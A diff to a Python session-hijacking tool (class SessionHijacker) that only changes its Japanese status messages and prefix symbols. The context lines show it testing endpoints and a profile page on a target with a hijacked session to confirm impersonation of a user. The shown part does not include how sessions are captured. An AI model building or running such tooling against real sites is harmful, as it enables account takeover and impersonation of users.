@@ -244,9 +244,9 @@ class SessionHijacker:
             response = self.test_endpoint(hijacked_session, self.target_url, endpoint)
             
             if response and response.status_code == 200:
-                print(f"[!] 攻撃成功: {endpoint}にアクセスできました")
+                print(f"[+] 攻撃成功: {endpoint}にアクセスできました")
                 if "プロフィール" in response.text or "profile" in response.text.lower():
-                    print("[!] ユーザーになりすましてアクセスできました")
+                    print("[+] ユーザーになりすましてアクセスできました")
                 success_count += 1
             else:
                 print(f"[*] 攻撃失敗: {endpoint}への認証が必要です")
@@ -256,13 +256,13 @@ class SessionHijacker:
         response = self.test_endpoint(hijacked_session, self.target_url, '')
         
         if response and response.status_code == 200:
-            print("[+] セッションハイジャックが成功しました！")
+            print("[+] セッションハイジャックが成功しました")
             return True
         elif success_count > 0:
-            print(f"[+] {success_count}個のエンドポイントへのアクセスに成功しました！")
+            print(f"[+] {success_count}個のエンドポイントへのアクセスに成功しました")
             return True
         else:
-            print("[!] セッションハイジャックが失敗しました")
+            print("[*] セッションハイジャックが失敗しました")
             return False
 
 
@@ -300,10 +300,9 @@ def main():
     )
     
     if success:
-        print("\n[+] セッションハイジャックが完了しました。")
         sys.exit(0)
     else:
-        print("\n[!] セッションハイジャックに失敗しました。")
+        print("\n[*] セッションハイジャックに失敗しました。")
         sys.exit(1)
 
 
